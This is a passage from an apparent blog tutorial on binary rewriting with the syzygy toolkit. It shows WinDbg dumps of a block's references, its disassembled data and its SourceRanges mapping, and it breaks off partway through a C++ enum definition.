<p>Let&rsquo;s have a look at the references associated with the <code>foo</code> block now. If you look closely at the block, the set of references is of size 3&hellip; what could they be?</p>

<p>One for the <code>printf</code> function, one for the data Block for the string passed to <code>printf</code> maybe?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">First</span> <span class="nl">reference:</span>
</span><span class='line'><span class="o">----------------</span>
</span><span class='line'>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="kt">int</span> <span class="k">const</span> <span class="p">,</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Reference</span><span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4f5640</span><span class="p">))</span>
</span><span class='line'>    <span class="n">first</span>            <span class="o">:</span> <span class="mi">57</span>
</span><span class='line'>    <span class="n">second</span>           <span class="p">[</span><span class="nl">Type:</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Reference</span><span class="p">]</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Reference</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4f5644</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">type_</span>            <span class="o">:</span> <span class="n">ABSOLUTE_REF</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">[</span><span class="nl">Type:</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">ReferenceType</span><span class="p">]</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x004</span><span class="p">]</span> <span class="n">size_</span>            <span class="o">:</span> <span class="mh">0x4</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x008</span><span class="p">]</span> <span class="n">referenced_</span>      <span class="o">:</span> <span class="mh">0x4ce334</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x00c</span><span class="p">]</span> <span class="n">offset_</span>          <span class="o">:</span> <span class="mi">0</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x010</span><span class="p">]</span> <span class="n">base_</span>            <span class="o">:</span> <span class="mi">0</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Block</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4ce334</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">id_</span>              <span class="o">:</span> <span class="mh">0xbc</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x004</span><span class="p">]</span> <span class="n">type_</span>            <span class="o">:</span> <span class="n">DATA_BLOCK</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x018</span><span class="p">]</span> <span class="n">name_</span>            <span class="o">:</span> <span class="mh">0xbb90f8</span> <span class="o">:</span> <span class="s">&quot;??_C@_0BO@LBGMPKED@Binary?5rewriting?5with?5syzygy?6?$AA@&quot;</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x01c</span><span class="p">]</span> <span class="n">compiland_name_</span>  <span class="o">:</span> <span class="mh">0x4c50b0</span> <span class="o">:</span> <span class="s">&quot;D:</span><span class="se">\t</span><span class="s">mp</span><span class="se">\t</span><span class="s">est\Debug\main.obj&quot;</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x058</span><span class="p">]</span> <span class="n">data_</span>            <span class="o">:</span> <span class="mh">0x4a11e0</span> <span class="o">:</span> <span class="mh">0x42</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x05c</span><span class="p">]</span> <span class="n">data_size_</span>       <span class="o">:</span> <span class="mh">0x1e</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">da</span> <span class="mh">0x4a11e0</span>
</span><span class='line'><span class="mo">004</span><span class="n">a11e0</span>  <span class="s">&quot;Binary rewriting with syzygy.&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">Second</span> <span class="nl">reference:</span>
</span><span class='line'><span class="o">-----------------</span>
</span><span class='line'>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="kt">int</span> <span class="k">const</span> <span class="p">,</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Reference</span><span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4f56a0</span><span class="p">))</span>
</span><span class='line'>    <span class="n">first</span>            <span class="o">:</span> <span class="mi">62</span>
</span><span class='line'>    <span class="n">second</span>           <span class="p">[</span><span class="nl">Type:</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Reference</span><span class="p">]</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Reference</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4f56a4</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">type_</span>            <span class="o">:</span> <span class="n">PC_RELATIVE_REF</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">[</span><span class="nl">Type:</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">ReferenceType</span><span class="p">]</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x004</span><span class="p">]</span> <span class="n">size_</span>            <span class="o">:</span> <span class="mh">0x4</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x008</span><span class="p">]</span> <span class="n">referenced_</span>      <span class="o">:</span> <span class="mh">0x4bd42c</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x00c</span><span class="p">]</span> <span class="n">offset_</span>          <span class="o">:</span> <span class="mi">0</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x010</span><span class="p">]</span> <span class="n">base_</span>            <span class="o">:</span> <span class="mi">0</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Block</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4bd42c</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">id_</span>              <span class="o">:</span> <span class="mh">0x53</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x004</span><span class="p">]</span> <span class="n">type_</span>            <span class="o">:</span> <span class="n">CODE_BLOCK</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x018</span><span class="p">]</span> <span class="n">name_</span>            <span class="o">:</span> <span class="mh">0x4ffd60</span> <span class="o">:</span> <span class="s">&quot;printf&quot;</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x01c</span><span class="p">]</span> <span class="n">compiland_name_</span>  <span class="o">:</span> <span class="mh">0x4c50b0</span> <span class="o">:</span> <span class="s">&quot;D:</span><span class="se">\t</span><span class="s">mp</span><span class="se">\t</span><span class="s">est\Debug\main.obj&quot;</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>
</span><span class='line'><span class="n">Third</span> <span class="nl">reference:</span>
</span><span class='line'><span class="o">----------------</span>
</span><span class='line'>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="kt">int</span> <span class="k">const</span> <span class="p">,</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Reference</span><span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4f5a90</span><span class="p">))</span>
</span><span class='line'>    <span class="n">first</span>            <span class="o">:</span> <span class="mi">83</span>
</span><span class='line'>    <span class="n">second</span>           <span class="p">[</span><span class="nl">Type:</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Reference</span><span class="p">]</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Reference</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4f5a94</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">type_</span>            <span class="o">:</span> <span class="n">PC_RELATIVE_REF</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">[</span><span class="nl">Type:</span> <span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">ReferenceType</span><span class="p">]</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x004</span><span class="p">]</span> <span class="n">size_</span>            <span class="o">:</span> <span class="mh">0x4</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x008</span><span class="p">]</span> <span class="n">referenced_</span>      <span class="o">:</span> <span class="mh">0x4bd52c</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x00c</span><span class="p">]</span> <span class="n">offset_</span>          <span class="o">:</span> <span class="mi">0</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x010</span><span class="p">]</span> <span class="n">base_</span>            <span class="o">:</span> <span class="mi">0</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">block_graph</span><span class="o">::</span><span class="n">BlockGraph</span><span class="o">::</span><span class="n">Block</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4bd52c</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">id_</span>              <span class="o">:</span> <span class="mh">0x54</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x004</span><span class="p">]</span> <span class="n">type_</span>            <span class="o">:</span> <span class="n">CODE_BLOCK</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x018</span><span class="p">]</span> <span class="n">name_</span>            <span class="o">:</span> <span class="mh">0xbb96c8</span> <span class="o">:</span> <span class="s">&quot;_RTC_CheckEsp&quot;</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x01c</span><span class="p">]</span> <span class="n">compiland_name_</span>  <span class="o">:</span> <span class="mh">0x4c5260</span> <span class="o">:</span> <span class="s">&quot;f:</span><span class="se">\b</span><span class="s">inaries\Intermediate</span><span class="se">\v</span><span class="s">ctools\msvcrt.nativeproj_607447030\objd</span><span class="se">\x86</span><span class="s">\_stack_.obj&quot;</span>
</span><span class='line'><span class="p">[...]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Perfect &ndash; that&rsquo;s what we sort of guessed! The last one is just the compiler adding <a href="https://msdn.microsoft.com/en-us/library/8wtf2dfz.aspx">Run-Time Error Checks</a> on us.</p>

<p>Let&rsquo;s have a closer look to the first reference. The <code>references_</code> member is a hash table of offsets and instances of reference.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="c1">// Map of references that this block makes to other blocks.</span>
</span><span class='line'><span class="k">typedef</span> <span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">Offset</span><span class="p">,</span> <span class="n">Reference</span><span class="o">&gt;</span> <span class="n">ReferenceMap</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The offset tells you where exactly in the <code>foo</code> block there is a reference; in our case we can see that the first reference is at offset 57 from the base of the block. If you start IDA real quick and browse at this address, you will see that it points one byte after the PUSH opcode (pointing exactly on the reference to the <code>_Format</code> string):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="p">.</span><span class="nl">text:</span><span class="mo">004010</span><span class="n">C8</span> <span class="mi">68</span> <span class="mi">20</span> <span class="mi">41</span> <span class="mi">40</span> <span class="mo">00</span> <span class="n">push</span>    <span class="n">offset</span> <span class="n">_Format</span>  <span class="p">;</span> <span class="s">&quot;Binary rewriting with syzygy</span><span class="se">\n</span><span class="s">&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Another interesting bit I didn&rsquo;t mention earlier is that naturally the <code>data_</code> field backs the actual content of the Block:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">u</span> <span class="err">@@</span><span class="n">c</span><span class="o">++</span><span class="p">(</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">data_</span><span class="p">)</span>
</span><span class='line'><span class="mo">004</span><span class="mi">9</span><span class="n">ef50</span> <span class="mi">55</span>              <span class="n">push</span>    <span class="n">ebp</span>
</span><span class='line'><span class="mo">004</span><span class="mi">9</span><span class="n">ef51</span> <span class="mi">8</span><span class="n">bec</span>            <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
</span><span class='line'><span class="mo">004</span><span class="mi">9</span><span class="n">ef53</span> <span class="mi">81</span><span class="n">eccc000000</span>    <span class="n">sub</span>     <span class="n">esp</span><span class="p">,</span><span class="mi">0</span><span class="n">CCh</span>
</span><span class='line'><span class="mo">004</span><span class="mi">9</span><span class="n">ef59</span> <span class="mi">53</span>              <span class="n">push</span>    <span class="n">ebx</span>
</span><span class='line'><span class="mo">004</span><span class="mi">9</span><span class="n">ef5a</span> <span class="mi">56</span>              <span class="n">push</span>    <span class="n">esi</span>
</span><span class='line'><span class="mo">004</span><span class="mi">9</span><span class="n">ef5b</span> <span class="mi">57</span>              <span class="n">push</span>    <span class="n">edi</span>
</span><span class='line'><span class="mo">004</span><span class="mi">9</span><span class="n">ef5c</span> <span class="mi">8</span><span class="n">dbd34ffffff</span>    <span class="n">lea</span>     <span class="n">edi</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">0</span><span class="n">CCh</span><span class="p">]</span>
</span><span class='line'><span class="mo">004</span><span class="mi">9</span><span class="n">ef62</span> <span class="n">b933000000</span>      <span class="n">mov</span>     <span class="n">ecx</span><span class="p">,</span><span class="mi">33</span><span class="n">h</span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://doar-e.github.io/images/binary_rewriting_with_syzygy/foo_disassview.png"></p>

<p>Last but not least, I mentioned SourceRanges (you can see it as a vector of pairs describing data ranges from the binary to the content in memory) before, so let&rsquo;s dump it to see what it looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRangeMap</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">,</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4bd36c</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">range_pairs_</span>     <span class="o">:</span> <span class="p">{</span> <span class="n">size</span><span class="o">=</span><span class="mi">1</span> <span class="p">}</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">,</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">,</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="o">&gt;</span> <span class="o">&gt;</span> <span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4bd36c</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="mi">0</span><span class="p">]</span>              <span class="o">:</span> <span class="p">{...},</span> <span class="p">{...}</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">,</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4da1c8</span><span class="p">))</span>
</span><span class='line'>    <span class="n">first</span>            <span class="p">[</span><span class="nl">Type:</span> <span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">]</span>
</span><span class='line'>    <span class="n">second</span>           <span class="p">[</span><span class="nl">Type:</span> <span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">]</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="kt">int</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4da1c8</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">start_</span>           <span class="o">:</span> <span class="mi">0</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x004</span><span class="p">]</span> <span class="n">size_</span>            <span class="o">:</span> <span class="mh">0x5b</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">core</span><span class="o">::</span><span class="n">AddressRange</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4da1d0</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">start_</span>           <span class="p">[</span><span class="nl">Type:</span> <span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">]</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x004</span><span class="p">]</span> <span class="n">size_</span>            <span class="o">:</span> <span class="mh">0x5b</span>
</span><span class='line'><span class="mi">0</span><span class="o">:</span><span class="mo">000</span><span class="o">&gt;</span> <span class="n">dx</span> <span class="o">-</span><span class="n">r1</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">instrument</span><span class="o">!</span><span class="n">core</span><span class="o">::</span><span class="n">detail</span><span class="o">::</span><span class="n">AddressImpl</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x4da1d0</span><span class="p">))</span>
</span><span class='line'>    <span class="p">[</span><span class="o">+</span><span class="mh">0x000</span><span class="p">]</span> <span class="n">value_</span>           <span class="o">:</span> <span class="mh">0x1090</span> <span class="p">[</span><span class="nl">Type:</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>In this SourceRanges, we have a mapping from the <a href="https://github.com/google/syzygy/blob/master/syzygy/block_graph/block_graph.h#L568">DataRange</a> (RVA 0, size 0x5B), to the <a href="https://github.com/google/syzygy/blob/master/syzygy/block_graph/block_graph.h#L571">SourceRange</a> (RVA 0x1090, size 0x5B &ndash; which matches the previous IDA screen shot, obviously). We will come back to those once we have actually modified / rewritten the blocks to see what happens to the SourceRanges.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c++'><span class='line'><span class="k">enum</span> <span class="n">AddressType</span> <span class="o">:</span> <span class="n">uint8_t</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">kRelativeAddressType</span><span class="p">,</span>
